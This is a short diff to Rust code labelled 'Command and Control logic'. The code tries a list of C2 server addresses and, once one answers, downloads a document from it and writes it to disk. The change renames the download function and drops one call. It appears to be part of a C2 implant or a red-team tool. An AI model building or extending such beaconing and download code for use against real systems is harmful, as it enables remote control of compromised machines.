@@ -1,7 +1,4 @@
-use std::{
-    fs::File,
-    io::{Read, Write},
-};
+use std::{fs::File, io::Write};
 
 // Command and Control logic
 use log::{error, info};
@@ -19,14 +16,12 @@ pub fn get_commands(c2: Vec<Addr>, docname: Docname) {
         // once we find a valid c2 server, stop looking
         match try_callout(&addr) {
             Ok(_) => {
-                update_conf(&addr, docname);
+                download_doc(&addr, docname);
                 break;
             }
             Err(e) => error!("{e}"),
         }
     }
-
-    crate::borrow::recent_config();
 }
 
 fn try_file_write(docname: String, body: &str) {
@@ -41,7 +36,7 @@ fn try_file_write(docname: String, body: &str) {
     }
 }
 
-fn update_conf(addr: &Addr, docname: Docname) -> () {
+fn download_doc(addr: &Addr, docname: Docname) -> () {
     info!("querying {:?}", addr);
     let mut dst: String = addr.clone();
     dst.push_str("/");
